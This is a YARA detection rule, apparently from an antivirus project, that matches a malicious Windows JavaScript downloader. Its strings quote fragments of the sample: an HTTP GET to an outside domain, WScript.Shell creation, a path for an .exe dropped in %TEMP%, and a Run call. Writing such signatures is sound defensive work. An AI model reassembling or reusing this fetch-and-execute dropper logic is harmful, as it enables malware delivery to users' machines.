rule sig_20160401_47e25a6e722b69d5c319be278ff850de {
  meta:
    description = "datamaliciousorder - file 20160401_47e25a6e722b69d5c319be278ff850de.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "97997fcd6fbd91bb91d73c0ff5fcb52035a3737e5e0681646ac59103a50f6476"

  strings:
    $s1  = "AtSpd[HqYj](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "var YmFyw = function YrcKmq() {return WScript[TuAhs](\"WScript\"+\".Shell\");}(), ReyGj = 11;" fullword ascii
    $s3  = "function ExOxv(XpKc, SuNw){NnKf = NnKf * 1; return XpKc - SuNw;};" fullword ascii
    $s4  = "if (AtSpd[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function KkaTzg()" fullword ascii
    $s6  = "function IsUw(){return PyNy + \"\";};" fullword ascii
    $s7  = "function MwHs() {return YmFyw[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ABZYQCSuy.ex\" + \"e\";};" fullword ascii
    $s8  = "function JwyMzj() {return ((GaHhe == true) && (GaHhe == AbfCix)) ? 1 : NnKf;};" fullword ascii
    $s9  = "var VqPce = false;" fullword ascii
    $s10 = "function LlEtf(GzNw){YmFyw[\"R\"+\"un\"](GzNw, NnKf, NnKf);};" fullword ascii
    $s11 = "var GaHhe = false;" fullword ascii
    $s12 = "function OdNrx(QnGtf) {var EppYim = (1, 2, 3, 4, 5, QnGtf); return EppYim;};" fullword ascii
    $s13 = "var AbfCix = false;" fullword ascii
    $s14 = "function NfyZc(){return 23;};" fullword ascii
    $s15 = "AbfCix = true; " fullword ascii
    $s16 = "function SdqAw(){return TuAhs;};" fullword ascii
    $s17 = "var MzZxg = new this[\"Date\"]();" fullword ascii
    $s18 = "GaHhe = true; " fullword ascii
    $s19 = "return ExOxv(UxlVeh, OdnOph);" fullword ascii
    $s20 = "}while (PfqEzj);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}